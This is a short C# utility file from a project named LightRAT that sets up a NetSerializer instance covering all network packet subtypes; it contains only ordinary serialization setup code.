using System;
using System.Collections.Generic;
using LightRAT.Core.Extensions;
using LightRAT.Core.Network.Packets;
using NetSerializer;

namespace LightRAT.Core.Utils
{
    public static class LightRATUtils
    {
        private static readonly IEnumerable<Type> subtypes = typeof(IPacket).GetSubTypes();
        public static Serializer packetSerializer = new Serializer(subtypes);
    }
}